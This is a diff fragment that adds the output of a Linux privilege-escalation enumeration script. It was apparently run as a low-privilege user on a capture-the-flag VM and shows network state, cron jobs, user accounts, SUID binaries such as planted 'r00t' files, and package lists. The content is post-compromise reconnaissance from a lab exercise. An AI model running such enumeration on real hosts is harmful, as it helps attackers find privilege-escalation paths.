+    Interrupt:9 Base address:0xd000
+    eth1      Link encap:Ethernet  HWaddr 08:00:27:db:56:ad
+    BROADCAST MULTICAST  MTU:1500  Metric:1
+    RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+    TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+    collisions:0 txqueuelen:1000
+    RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+    Interrupt:11 Base address:0xd240
+    lo        Link encap:Local Loopback
+    inet addr:127.0.0.1  Mask:255.0.0.0
+    inet6 addr: ::1/128 Scope:Host
+    UP LOOPBACK RUNNING  MTU:16436  Metric:1
+    RX packets:24 errors:0 dropped:0 overruns:0 frame:0
+    TX packets:24 errors:0 dropped:0 overruns:0 carrier:0
+    collisions:0 txqueuelen:0
+    RX bytes:1736 (1.7 KB)  TX bytes:1736 (1.7 KB)
+
+[+] Netstat
+    Active Internet connections (servers and established)
+    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+    tcp        0      0 192.168.43.4:22         192.168.43.3:40994      ESTABLISHED -
+    tcp6       0      0 :::22                   :::*                    LISTEN      -
+    udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+
+[+] Route
+    Kernel IP routing table
+    Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+    192.168.43.0    *               255.255.255.0   U     0      0        0 eth0
+
+[*] GETTING FILESYSTEM INFO...
+
+[+] Mount results
+    /dev/sda1 on / type ext4 (rw,errors=remount-ro)
+    proc on /proc type proc (rw,noexec,nosuid,nodev)
+    sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
+    none on /sys/fs/fuse/connections type fusectl (rw)
+    none on /sys/kernel/debug type debugfs (rw)
+    none on /sys/kernel/security type securityfs (rw)
+    udev on /dev type devtmpfs (rw,mode=0755)
+    devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)
+    tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)
+    none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)
+    none on /run/shm type tmpfs (rw,nosuid,nodev)
+
+[+] fstab entries
+    # /etc/fstab: static file system information.
+    #
+    # Use 'blkid' to print the universally unique identifier for a
+    # device; this may be used with UUID= as a more robust way to name devices
+    # that works even if disks are added and removed. See fstab(5).
+    #
+    # <file system> <mount point>   <type>  <options>       <dump>  <pass>
+    proc            /proc           proc    nodev,noexec,nosuid 0       0
+    # / was on /dev/sda1 during installation
+    UUID=640d99df-fd2f-4ed4-9611-02d599af2329 /               ext4    errors=remount-ro 0       1
+    # swap was on /dev/sda5 during installation
+    UUID=798a0bcb-61ee-4753-b3f0-003397be22a2 none            swap    sw              0       0
+    /dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0
+
+[+] Scheduled cron jobs
+    -rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab
+    /etc/cron.d:
+    total 12
+    drwxr-xr-x  2 root root 4096 Oct  3  2014 .
+    drwxr-xr-x 83 root root 4096 Oct 30 07:29 ..
+    -rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+    /etc/cron.daily:
+    total 68
+    drwxr-xr-x  2 root root  4096 Oct  3  2014 .
+    drwxr-xr-x 83 root root  4096 Oct 30 07:29 ..
+    -rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
+    -rwxr-xr-x  1 root root   633 Jul 22  2014 apache2
+    -rwxr-xr-x  1 root root 15399 Jun 15  2012 apt
+    -rwxr-xr-x  1 root root   314 Mar 30  2012 aptitude
+    -rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
+    -rwxr-xr-x  1 root root   256 Apr 12  2012 dpkg
+    -rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
+    -rwxr-xr-x  1 root root  1365 Mar 31  2012 man-db
+    -rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
+    -rwxr-xr-x  1 root root   249 Apr  8  2012 passwd
+    -rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
+    -rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
+    /etc/cron.hourly:
+    total 12
+    drwxr-xr-x  2 root root 4096 Oct  3  2014 .
+    drwxr-xr-x 83 root root 4096 Oct 30 07:29 ..
+    -rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+    /etc/cron.monthly:
+    total 12
+    drwxr-xr-x  2 root root 4096 Oct  3  2014 .
+    drwxr-xr-x 83 root root 4096 Oct 30 07:29 ..
+    -rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+    /etc/cron.weekly:
+    total 20
+    drwxr-xr-x  2 root root 4096 Oct  3  2014 .
+    drwxr-xr-x 83 root root 4096 Oct 30 07:29 ..
+    -rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+    -rwxr-xr-x  1 root root  730 Dec 30  2011 apt-xapian-index
+    -rwxr-xr-x  1 root root  907 Mar 31  2012 man-db
+
+[+] Writable cron dirs
+
+
+[*] ENUMERATING USER AND ENVIRONMENTAL INFO...
+
+[+] Logged in User Activity
+    07:46:47 up 17 min,  0 users,  load average: 0.00, 0.01, 0.03
+    USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Super Users Found:
+    root
+
+[+] Environment
+    MAIL=/var/mail/noob
+    SSH_CLIENT=192.168.43.3 40994 22
+    USER=noob
+    SHLVL=2
+    HOME=/home/noob
+    OLDPWD=/home/noob/.ssh
+    LOGNAME=noob
+    _=/usr/bin/python
+    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+    SHELL=/bin/bash
+    PWD=/tmp
+    SSH_CONNECTION=192.168.43.3 40994 192.168.43.4 22
+
+[+] Root and current user history (depends on privs)
+    -rw------- 1 noob noob 75 Oct 14  2014 /home/noob/.bash_history
+
+[+] Sudoers (privileged)
+
+[+] All users
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+    bin:x:2:2:bin:/bin:/bin/sh
+    sys:x:3:3:sys:/dev:/bin/sh
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/bin/sh
+    man:x:6:12:man:/var/cache/man:/bin/sh
+    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+    mail:x:8:8:mail:/var/mail:/bin/sh
+    news:x:9:9:news:/var/spool/news:/bin/sh
+    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+    proxy:x:13:13:proxy:/bin:/bin/sh
+    www-data:x:33:33:www-data:/var/www:/bin/sh
+    backup:x:34:34:backup:/var/backups:/bin/sh
+    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+    libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+    syslog:x:101:103::/home/syslog:/bin/false
+    messagebus:x:102:104::/var/run/dbus:/bin/false
+    maleus:x:1000:1000:Tr0ll,,,:/home/maleus:/bin/bash
+    sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+    ftp:x:104:111:ftp daemon,,,:/srv/ftp:/bin/false
+    noob:x:1002:1002::/home/noob:/bin/bash
+    Tr0ll:x:1001:1001::/home/tr0ll:/bin/false
+
+[+] Current User
+    noob
+
+[+] Current User ID
+    uid=1002(noob) gid=1002(noob) groups=1002(noob)
+
+[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...
+
+[+] World Writeable Directories for User/Group 'Root'
+    drwxrwxrwt 2 root root 4096 Aug  3  2012 /var/tmp
+    drwxrwxrwt 2 root root 40 Oct 30 07:29 /run/shm
+    drwxrwxrwt 4 root root 80 Oct 30 07:29 /run/lock
+    drwxrwxrwt 2 root root 4096 Oct 30 07:46 /tmp
+
+[+] World Writeable Directories for Users other than Root
+
+[+] World Writable Files
+    -rwxrwxrwx 1 root root 104508 Mar 31  2012 /bin/ls
+
+[+] Checking if root's home folder is accessible
+
+[+] SUID/SGID Files and Directories
+    -rwsr-xr-x 1 root root 31116 Apr  8  2012 /bin/su
+    -rwsr-xr-x 1 root root 67720 Mar 29  2012 /bin/umount
+    -rwsr-xr-x 1 root root 34740 Nov  8  2011 /bin/ping
+    -rwsr-xr-x 1 root root 88760 Mar 29  2012 /bin/mount
+    -rwsr-xr-x 1 root root 26252 Mar  2  2012 /bin/fusermount
+    -rwsr-xr-x 1 root root 39116 Nov  8  2011 /bin/ping6
+    drwxrwsr-x 6 root staff 4096 Oct  3  2014 /usr/local/share/xml
+    drwxrwsr-x 2 root staff 4096 Oct  3  2014 /usr/local/share/xml/schema
+    drwxrwsr-x 2 root staff 4096 Oct  3  2014 /usr/local/share/xml/misc
+    drwxrwsr-x 2 root staff 4096 Oct  3  2014 /usr/local/share/xml/entities
+    drwxrwsr-x 2 root staff 4096 Oct  3  2014 /usr/local/share/xml/declaration
+    drwxrwsr-x 7 root staff 4096 Oct  3  2014 /usr/local/share/sgml
+    drwxrwsr-x 2 root staff 4096 Oct  3  2014 /usr/local/share/sgml/misc
+    drwxrwsr-x 2 root staff 4096 Oct  3  2014 /usr/local/share/sgml/stylesheet
+    drwxrwsr-x 2 root staff 4096 Oct  3  2014 /usr/local/share/sgml/dtd
+    drwxrwsr-x 2 root staff 4096 Oct  3  2014 /usr/local/share/sgml/entities
+    drwxrwsr-x 2 root staff 4096 Oct  3  2014 /usr/local/share/sgml/declaration
+    drwxrwsr-x 2 root staff 4096 Oct  3  2014 /usr/local/share/ca-certificates
+    drwxrwsr-x 4 root staff 4096 Oct  3  2014 /usr/local/lib/python2.7
+    drwxrwsr-x 2 root staff 4096 Oct  3  2014 /usr/local/lib/python2.7/dist-packages
+    drwxrwsr-x 2 root staff 4096 Oct  3  2014 /usr/local/lib/python2.7/site-packages
+    -rwsr-xr-x 1 root root 40292 Apr  8  2012 /usr/bin/chfn
+    -rwsr-sr-x 1 daemon daemon 42800 Oct 25  2011 /usr/bin/at
+    -rwxr-sr-x 1 root tty 18036 Mar 29  2012 /usr/bin/wall
+    -rwsr-xr-x 1 root root 30896 Apr  8  2012 /usr/bin/newgrp
+    -rwsr-xr-x 2 root root 69708 May 31  2012 /usr/bin/sudoedit
+    -rwxr-sr-x 1 root shadow 18120 Apr  8  2012 /usr/bin/expiry
+    -rwsr-xr-x 1 root root 41284 Apr  8  2012 /usr/bin/passwd
+    -rwxr-sr-x 1 root shadow 45284 Apr  8  2012 /usr/bin/chage
+    -rwxr-sr-x 1 root tty 9728 Mar 31  2012 /usr/bin/bsd-write
+    -rwsr-xr-x 1 root root 56208 Jul 28  2011 /usr/bin/mtr
+    -rwsr-xr-x 2 root root 69708 May 31  2012 /usr/bin/sudo
+    -rwsr-xr-x 1 root root 31748 Apr  8  2012 /usr/bin/chsh
+    -rwxr-sr-x 3 root mail 9684 Oct 18  2011 /usr/bin/mail-unlock
+    -rwxr-sr-x 1 root crontab 34776 Jun 19  2012 /usr/bin/crontab
+    -rwxr-sr-x 3 root mail 9684 Oct 18  2011 /usr/bin/mail-touchlock
+    -rwsr-xr-x 1 root root 14012 Nov  8  2011 /usr/bin/traceroute6.iputils
+    -rwxr-sr-x 1 root mail 13932 Oct 17  2011 /usr/bin/dotlockfile
+    -rwxr-sr-x 1 root mlocate 34432 Aug 17  2011 /usr/bin/mlocate
+    -rwxr-sr-x 1 root ssh 128416 Apr 29  2014 /usr/bin/ssh-agent
+    -rwxr-sr-x 3 root mail 9684 Oct 18  2011 /usr/bin/mail-lock
+    -rwsr-xr-x 1 root root 57956 Apr  8  2012 /usr/bin/gpasswd
+    -rwsr-xr-- 1 root dip 273272 Feb  4  2011 /usr/sbin/pppd
+    -rwsr-sr-x 1 libuuid libuuid 17976 Mar 29  2012 /usr/sbin/uuidd
+    -rwsr-xr-x 1 root root 5564 Dec 13  2011 /usr/lib/eject/dmcrypt-get-device
+    -r-sr-xr-x 1 root root 9532 Oct  3  2014 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+    -r-sr-xr-x 1 root root 10224 Oct  3  2014 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+    -rwsr-xr-x 1 root root 9728 Aug 27  2014 /usr/lib/pt_chown
+    -rwsr-xr-- 1 root messagebus 316824 Feb 22  2012 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    -rwsr-xr-x 1 root root 248056 Apr 29  2014 /usr/lib/openssh/ssh-keysign
+    drwsr-xr-x 3 root root 4096 Oct 30 07:45 /nothing_to_see_here
+    drwsr-xr-x 5 root root 4096 Oct  4  2014 /nothing_to_see_here/choose_wisely
+    drwsr-xr-x 2 root root 4096 Oct  5  2014 /nothing_to_see_here/choose_wisely/door2
+    -rwsr-xr-x 1 root root 8401 Oct  5  2014 /nothing_to_see_here/choose_wisely/door2/r00t
+    drwsr-xr-x 2 root root 4096 Oct  5  2014 /nothing_to_see_here/choose_wisely/door3
+    -rwsr-xr-x 1 root root 7273 Oct  5  2014 /nothing_to_see_here/choose_wisely/door3/r00t
+    drwsr-xr-x 2 root root 4096 Oct  4  2014 /nothing_to_see_here/choose_wisely/door1
+    -rwsr-xr-x 1 root root 7271 Oct  4  2014 /nothing_to_see_here/choose_wisely/door1/r00t
+    drwxrwsr-x 2 root staff 4096 Aug  3  2012 /var/local
+    drwxrwsr-x 2 root mail 4096 Oct  3  2014 /var/mail
+    drwxr-sr-x 31 man root 4096 Oct  5  2014 /var/cache/man
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/ja
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/ja/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/ja/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/ja/cat5
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/es
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/es/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/es/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/es/cat5
+    drwxr-sr-x 4 man root 4096 Oct  5  2014 /var/cache/man/sl
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/sl/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/sl/cat8
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/pt_BR
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/pt_BR/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/pt_BR/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/pt_BR/cat5
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/it
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/it/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/it/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/it/cat5
+    drwxr-sr-x 3 man root 4096 Oct  5  2014 /var/cache/man/gl
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/gl/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/cat1
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/nl
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/nl/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/nl/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/nl/cat5
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/sv
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/sv/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/sv/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/sv/cat5
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/cat2
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/fr
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/fr/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/fr/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/fr/cat5
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/pl
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/pl/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/pl/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/pl/cat5
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/tr
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/tr/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/tr/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/tr/cat5
+    drwxr-sr-x 4 man root 4096 Oct  5  2014 /var/cache/man/fi
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/fi/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/fi/cat8
+    drwxr-sr-x 6 man root 4096 Oct  5  2014 /var/cache/man/de
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/de/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/de/cat3
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/de/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/de/cat5
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/cat3
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/zh_CN
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/zh_CN/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/zh_CN/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/zh_CN/cat5
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/cat5
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/ko
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/ko/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/ko/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/ko/cat5
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/cat6
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/ru
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/ru/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/ru/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/ru/cat5
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/zh_TW
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/zh_TW/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/zh_TW/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/zh_TW/cat5
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/hu
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/hu/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/hu/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/hu/cat5
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/cat7
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/cs
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/cs/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/cs/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/cs/cat5
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/pt
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/pt/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/pt/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/pt/cat5
+    drwxr-sr-x 5 man root 4096 Oct  5  2014 /var/cache/man/id
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/id/cat1
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/id/cat8
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/id/cat5
+    drwxr-sr-x 2 man root 4096 Oct  3  2014 /var/cache/man/cat4
+    drwxrwsr-x 2 libuuid libuuid 4096 Oct  3  2014 /var/lib/libuuid
+    drwxr-s--- 2 root dip 4096 Oct  3  2014 /etc/chatscripts
+    drwxr-s--- 2 root dip 4096 Oct  3  2014 /etc/ppp/peers
+    -rwxr-sr-x 1 root shadow 30364 Feb  8  2012 /sbin/unix_chkpwd
+
+[+] Logs containing keyword 'password'
+
+[+] Config files containing keyword 'password'
+    /etc/ltrace.conf:; pwd.h
+    /etc/hdparm.conf:# --security-set-pass Set security password
+    /etc/hdparm.conf:# security_pass = password
+    /etc/hdparm.conf:# --user-master Select password to use
+    /etc/ssl/openssl.cnf:# input_password = secret
+    /etc/ssl/openssl.cnf:# output_password = secret
+    /etc/ssl/openssl.cnf:challengePassword		= A challenge password
+    /etc/iscsi/iscsid.conf:# To set a CHAP username and password for initiator
+    /etc/iscsi/iscsid.conf:#node.session.auth.password = password
+    /etc/iscsi/iscsid.conf:# To set a CHAP username and password for target(s)
+    /etc/iscsi/iscsid.conf:#node.session.auth.password_in = password_in
+    /etc/iscsi/iscsid.conf:# To set a discovery session CHAP username and password for the initiator
+    /etc/iscsi/iscsid.conf:#discovery.sendtargets.auth.password = password
+    /etc/iscsi/iscsid.conf:# To set a discovery session CHAP username and password for target(s)
+    /etc/iscsi/iscsid.conf:#discovery.sendtargets.auth.password_in = password_in
+    /etc/debconf.conf:# World-readable, and accepts everything but passwords.
+    /etc/debconf.conf:Reject-Type: password
+    /etc/debconf.conf:# Not world readable (the default), and accepts only passwords.
+    /etc/debconf.conf:Name: passwords
+    /etc/debconf.conf:Accept-Type: password
+    /etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
+    /etc/debconf.conf:# databases, one to hold passwords and one for everything else.
+    /etc/debconf.conf:Stack: config, passwords
+    /etc/debconf.conf:# A remote LDAP database. It is also read-only. The password is really
+
+[+] Shadow File (Privileged)
+
+[*] ENUMERATING PROCESSES AND APPLICATIONS...
+
+[+] Installed Packages
+    Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
+    Err?=(none)/Reinst-required (Status,Err:
+    Name Version
+    accountsservice 0.6.15-2ubuntu9.3  and manipulate user account information
+    adduser 3.113ubuntu2  and remove users and groups
+    apache2 2.2.22-1ubuntu1.7  HTTP Server metapackage
+    apache2-mpm-worker 2.2.22-1ubuntu1.7  HTTP Server - high speed threaded model
+    apache2-utils 2.2.22-1ubuntu1.7  programs for webservers
+    apache2.2-bin 2.2.22-1ubuntu1.7  HTTP Server common binary files
+    apache2.2-common 2.2.22-1ubuntu1.7  HTTP Server common files
+    apparmor 2.7.102-0ubuntu3.1  parser utility for AppArmor
+    apt 0.8.16~exp12ubuntu10.2  package manager
+    apt-transport-https 0.8.16~exp12ubuntu10.2  download transport for APT
+    apt-utils 0.8.16~exp12ubuntu10.2  managment related utility programs
+    apt-xapian-index 0.44ubuntu5  and search tools for a Xapian index of Debian packages
+    aptitude 0.6.6-1ubuntu1  package manager (terminal interface only)
+    at 3.1.13-1ubuntu1  job execution and batch processing
+    base-files 6.5ubuntu6.2  base system miscellaneous files
+    base-passwd 3.5.24  base system master password and group files
+    bash 4.2-2ubuntu2  Bourne Again SHell
+    bash-completion 1:1.3-1ubuntu8  completion for the bash shell
+    bind9-host 1:9.8.1.dfsg.P1-4ubuntu0.2  of 'host' bundled with BIND 9.X
+    binutils 2.22-6ubuntu1.1  assembler, linker and binary utilities
+    bsdmainutils 8.2.3ubuntu1  of more utilities from FreeBSD
+    bsdutils 1:2.20.1-1ubuntu3  utilities from 4.4BSD-Lite
+    busybox-initramfs 1:1.18.5-1ubuntu4  shell setup for initramfs
+    busybox-static 1:1.18.5-1ubuntu4  rescue shell with tons of builtin utilities
+    bzip2 1.0.6-1  block-sorting file compressor - utilities
+    ca-certificates 20111211  CA certificates
+    command-not-found 0.2.46ubuntu6  installation of packages in interactive bash sessions
+    command-not-found-data 0.2.46ubuntu6  of data files for command-not-found.
+    console-setup 1.70ubuntu5  font and keymap setup program
+    coreutils 8.13-3ubuntu3  core utilities
+    cpio 2.11-7ubuntu3  cpio -- a program to manage archives of files
+    cpp 4:4.6.3-1ubuntu5  C preprocessor (cpp)
+    cpp-4.6 4.6.3-1ubuntu5  C preprocessor
+    crda 1.1.2-1ubuntu1  Central Regulatory Domain Agent
+    cron 3.0pl1-120ubuntu4  scheduling daemon
+    dash 0.5.7-2ubuntu2  shell
+    dbus 1.4.18-1ubuntu1  interprocess messaging system (daemon and utilities)
+    debconf 1.5.42ubuntu1  configuration management system
+    debconf-i18n 1.5.42ubuntu1  internationalization support for debconf
+    debianutils 4.2.1ubuntu2  utilities specific to Debian
+    dictionaries-common 1.12.1ubuntu2  utilities for spelling dictionary tools
+    diffutils 1:3.2-1ubuntu1  comparison utilities
+    dmidecode 2.11-4  table decoder
+    dmsetup 2:1.02.48-4ubuntu7.1  Linux Kernel Device Mapper userspace library
+    dnsutils 1:9.8.1.dfsg.P1-4ubuntu0.2  provided with BIND
+    dosfstools 3.0.12-1ubuntu1  for making and checking MS-DOS FAT filesystems
+    dpkg 1.16.1.2ubuntu7  package management system
+    e2fslibs 1.42-1ubuntu2  file system libraries
+    e2fsprogs 1.42-1ubuntu2  file system utilities
+    ed 1.5-3  UNIX line editor
+    eject 2.1.5+deb1+cvs20081104-9  CDs and operates CD-Changers under Linux
+    file 5.09-2  file type using "magic" numbers
+    findutils 4.4.2-4ubuntu1  for finding files--find, xargs
+    friendly-recovery 0.2.25  recovery more user-friendly
+    ftp 0.17-25  file transfer client
+    fuse 2.8.6-2ubuntu2  in Userspace
+    g++ 4:4.6.3-1ubuntu5  C++ compiler
+    g++-4.6 4.6.3-1ubuntu5  C++ compiler
+    gcc 4:4.6.3-1ubuntu5  C compiler
+    gcc-4.6 4.6.3-1ubuntu5  C compiler
+    gcc-4.6-base 4.6.3-1ubuntu5  the GNU Compiler Collection (base package)
+    gdb 7.4-2012.04-0ubuntu2.1  GNU Debugger
+    geoip-database 20111220-1  lookup command line tools that use the GeoIP library (country database)
+    gettext-base 0.18.1.1-5ubuntu3  Internationalization utilities for the base system
+    gir1.2-glib-2.0 1.32.0-1  data for GLib, GObject, Gio and GModule
+    gnupg 1.4.11-3ubuntu2  privacy guard - a free PGP replacement
+    gpgv 1.4.11-3ubuntu2  privacy guard - signature verification tool
+    grep 2.10-1  grep, egrep and fgrep
+    groff-base 1.21-7  troff text-formatting system (base system components)
+    grub-common 1.99-21ubuntu3.17  Unified Bootloader (common files)
+    grub-gfxpayload-lists 0.6  gfxpayload blacklist
+    grub-pc 1.99-21ubuntu3.17  Unified Bootloader, version 2 (PC/BIOS version)
+    grub-pc-bin 1.99-21ubuntu3.17  Unified Bootloader, version 2 (PC/BIOS binaries)
+    grub2-common 1.99-21ubuntu3.17  Unified Bootloader (common files for version 2)
+    gzip 1.4-1ubuntu2  compression utilities
+    hdparm 9.37-0ubuntu3.1  hard disk parameters for high performance
+    hostname 3.06ubuntu1  to set/show the host name or domain name
+    ifupdown 0.7~beta2ubuntu8  level tools to configure network interfaces
+    info 4.13a.dfsg.1-8ubuntu2  GNU Info documentation browser
+    initramfs-tools 0.99ubuntu13  for generating an initramfs
+    initramfs-tools-bin 0.99ubuntu13  used by initramfs-tools
+    initscripts 2.88dsf-13.10ubuntu11.1  for initializing and shutting down the system
+    insserv 1.14.0-2.1ubuntu2  to organize boot sequence using LSB init.d script dependencies
+    install-info 4.13a.dfsg.1-8ubuntu2  installed documentation in info format
+    installation-report 2.46ubuntu1  installation report
+    iproute 20111117-1ubuntu2  and traffic control tools
+    iptables 1.4.12-1ubuntu4  tools for packet filtering and NAT
+    iputils-ping 3:20101006-1ubuntu1  to test the reachability of network hosts
+    iputils-tracepath 3:20101006-1ubuntu1  to trace the network path to a remote host
+    irqbalance 0.56-1ubuntu4  to balance interrupts for SMP systems
+    isc-dhcp-client 4.1.ESV-R4-0ubuntu5.2  DHCP client
+    isc-dhcp-common 4.1.ESV-R4-0ubuntu5.2  files used by all the isc-dhcp* packages
+    iso-codes 3.31-1  language, territory, currency, script codes and their translations
+    kbd 1.15.2-3ubuntu4  console font and keytable utilities
+    keyboard-configuration 1.70ubuntu5  keyboard preferences
+    klibc-utils 1.5.25-1ubuntu2  utilities built with klibc for early boot
